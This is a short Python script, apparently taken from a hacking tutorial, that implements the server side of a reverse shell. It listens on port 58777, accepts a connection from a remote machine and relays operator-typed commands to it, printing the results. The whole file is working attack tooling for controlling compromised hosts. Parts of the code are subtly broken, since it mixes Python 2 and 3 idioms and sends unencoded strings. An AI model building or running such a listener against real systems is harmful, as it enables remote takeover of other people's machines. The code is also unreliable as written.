#!/usr/bin/env python
# -*- coding: utf-8 -*-
# revshell_server.py
# http://null-byte.wonderhowto.com/how-to/reverse-shell-using-python-0163875/

import sys, os, os.path
import socket 

class ReverseShellServer:
    
    host = '0.0.0.0'
    port = 58777
    s = None
    max_bind_retries = 10
    conn = None
    addr = None
    hostname = None
    
    def create(self, port):
        self.s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        self.port = port

    def bind(self, current_try=0):
        try:
            print("listening on port %s (attempt %d)" % (self.port, current_try))
            self.s.bind((self.host, self.port))
            self.s.listen(1)
        except socket.error as msg:
            print('socket binding error:', msg[0], file=sys.stderr)
            if current_try < self.max_bind_retries: 
                print('retrying...', file=sys.stderr)
                self.bind(current_try + 1)

    def accept(self):
        try:
            self.conn, self.addr = self.s.accept()
            print('[!] session opened at %s:%s' % (self.addr[0], self.addr[1]))
            self.hostname = self.conn.recv(1024)
            self.menu()
        except socket.error as msg:
            print('socket accepting error:', msg[0], file=sys.stderr)

    def menu(self):
        while True:
            cmd = input(str(self.addr[0]) + '@' + str(self.hostname) + '> ')
            if cmd == 'quit':
                self.conn.close()
                self.s.close()
                return
            command = self.conn.send(cmd)
            result = self.conn.recv(16834)
            if result != self.hostname:
                print(result)

def main(args):
    server = ReverseShellServer()
    server.create(args.port)
    server.bind()
    server.accept()
    print('[*] returned from socketAccept')
    return 0

if __name__ == '__main__':
    from argparse import ArgumentParser
    p = ArgumentParser()
    p.add_argument('--port', '-p', type=int, default=58777)
    args = p.parse_args()
    code = main(args)
    exit(code)